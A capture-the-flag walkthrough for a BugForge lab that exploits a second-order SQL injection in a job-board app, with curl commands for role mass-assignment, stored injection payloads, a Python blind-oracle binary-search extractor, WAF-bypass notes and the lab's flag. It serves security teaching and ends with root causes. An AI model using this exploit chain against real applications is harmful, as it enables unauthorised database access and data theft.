# furhire-003 - BugForge Lab Walkthrough

**URL:** https://lab-1781041320459-e8u4kx.labs-app.bugforge.io/
**Difficulty:** Medium  
**Vulnerability:** Second-Order SQL Injection (SQLite)
**Flag:** `bug{oAEQO4cjBuoH9iY9NXzGR9IAsu5SIOrE}`

---

## Summary

FurHire is a job-board SPA with recruiter and applicant roles. The job title field is stored safely via parameterised query, but then used unsafely (string-concatenated) in the `GET /api/jobs/:id/applicants` query. Using a boolean blind oracle built on the second-order injection, the flag was extracted character by character from the `config` table via binary search.

## Tech Stack

- Frontend: React SPA
- Backend: Node.js / Express
- DB: SQLite
- Auth: JWT (HS256, no exp claim)

## Key Endpoints

| Endpoint | Auth | Notes |
|---|---|---|
| `POST /api/register` | None | Supports `role: recruiter` mass assignment |
| `POST /api/jobs` | JWT (recruiter) | Title stored safely but used unsafely later |
| `POST /api/jobs/:id/apply` | JWT (user) | Creates application record |
| `GET /api/jobs/:id/applicants` | JWT (recruiter) | **Vulnerable** - embeds stored title into SQL |

## Attack Chain

**Step 1 - Register two accounts**

```bash
# Recruiter (mass-assign role)
curl -s -X POST $TARGET/api/register \
  -H "Content-Type: application/json" \
  -d '{"username":"recr1","password":"Password123!","role":"recruiter"}'
# Save RECR_TOKEN

# Applicant user
curl -s -X POST $TARGET/api/register \
  -H "Content-Type: application/json" \
  -d '{"username":"tester1","password":"Password123!"}'
# Save USER_TOKEN
```

**Step 2 - Confirm second-order SQLi primitive**

Create a job with `' OR 1=1--` as the title, apply to it, then view its applicants:

```bash
curl -s -X POST $TARGET/api/jobs \
  -H "Authorization: Bearer $RECR_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"title":"'"'"' OR 1=1--","description":"x","location":"London","job_type":"Full-time","salary_range":"50k","requirements":["x"]}'
# Save JOB_ID

curl -s -X POST $TARGET/api/jobs/$JOB_ID/apply \
  -H "Authorization: Bearer $USER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"cover_letter":"x"}'

curl -s $TARGET/api/jobs/$JOB_ID/applicants \
  -H "Authorization: Bearer $RECR_TOKEN"
```

Returns ALL applications from ALL jobs, not just this one - confirms the stored title is embedded unsafely into the WHERE clause.

**Step 3 - Build boolean oracle**

The injectable query structure:
```sql
SELECT ... FROM applications WHERE job_id IN
  (SELECT id FROM jobs WHERE title = '<STORED_TITLE>' AND ...)
```

Oracle pattern: create a job with title `' OR (condition)--`, apply to it, check `/applicants`:
- Non-empty response (`"id":` present) → condition is True
- Empty array `[]` → condition is False

```python
def oracle(condition):
    title = "' OR (" + condition + ")--"
    # POST /api/jobs with title → save job_id
    # POST /api/jobs/$job_id/apply
    # GET /api/jobs/$job_id/applicants → True if '"id":' in response
```

**Step 4 - Enumerate tables**

```sql
oracle("(SELECT COUNT(*) FROM sqlite_master WHERE type='table' AND name='config')>0") → True
```

Confirmed tables: `users`, `jobs`, `applications`, `companies`, `config`.

**Step 5 - Locate flag**

```
oracle("(SELECT value FROM config WHERE value LIKE 'bug%' LIMIT 1) IS NOT NULL") → True
oracle("(SELECT value FROM config WHERE value LIKE 'bug%' LIMIT 1) > 'bug{'") → True
oracle("(SELECT value FROM config WHERE value LIKE 'bug%' LIMIT 1) > 'bug|'") → False
```

Flag is in `config.value` where `value LIKE 'bug%'`.

**Step 6 - Extract flag via binary search**

`SUBSTR` and `X'hex'` blob comparisons both failed (see Dead Ends). Working approach: pure string comparison binary search using single-arg `CHAR()` chained with `||`:

```python
FLAG = "SELECT value FROM config WHERE value LIKE 'bug%' LIMIT 1"

def to_char_expr(s):
    return "||".join(f"CHAR({ord(c)})" for c in s)

def oracle_ge(prefix):
    return oracle(f"({FLAG}) >= {to_char_expr(prefix)}")

# Binary search: find largest c such that flag >= known_prefix + chr(c)
known = ""
for pos in range(1, 60):
    lo_c, hi_c = 32, 126
    while lo_c < hi_c:
        mid_c = (lo_c + hi_c + 1) // 2
        if oracle_ge(known + chr(mid_c)):
            lo_c = mid_c
        else:
            hi_c = mid_c - 1
    known += chr(lo_c)
    if chr(lo_c) == '}':
        break
```

~224 oracle calls (7 per character × 32 characters), 3 HTTP requests each.

**Flag:** `bug{oAEQO4cjBuoH9iY9NXzGR9IAsu5SIOrE}`

## Discovery Notes

- `' OR 1=1--` returning all applicants was the definitive confirmation - the title is used in a WHERE clause without any sanitisation.
- The oracle required the apply step: without an application record for the job, the applicants endpoint returns empty regardless of injection.
- String comparison operators (`>`, `<`, `>=`) were reliable; function-based extraction (SUBSTR, HEX) was not.

## Dead Ends

| Tried | Why It Failed | Lesson |
|---|---|---|
| WAF on URL params with `'` + SPACE | WAF on query strings; POST body unfiltered | Second-order: inject in POST body, trigger via GET |
| `SUBSTR(value,1,1)='b'` | Returns False even when string comparison confirms 'b' - SQLite affinity edge case in subquery context | Use `>` / `<` string comparison instead |
| `X'hex'` blob literals for `>=` comparison | SQLite type affinity: TEXT < BLOB, so `text >= X'hex'` is always False | Use `CHAR(n)||CHAR(n)` to produce TEXT literals |
| Multi-arg `CHAR(98,117,103)` | Broken in this SQLite build - does not equal `'bug'` | Use single-arg `CHAR(n)` chained with `||` |

## Root Causes

1. Job title retrieved from DB then string-concatenated into the applicants SQL query - safe at write time, unsafe at read time.
2. No parameterised queries on the applicants lookup path.
3. `config` table with the flag accessible to any authenticated user who can trigger the SQLi.

## CWE / OWASP

- CWE-89: Improper Neutralisation of Special Elements used in an SQL Command (SQL Injection)
- CWE-501: Trust Boundary Violation (stored data reused in unsafe context)
- OWASP A03:2021 - Injection
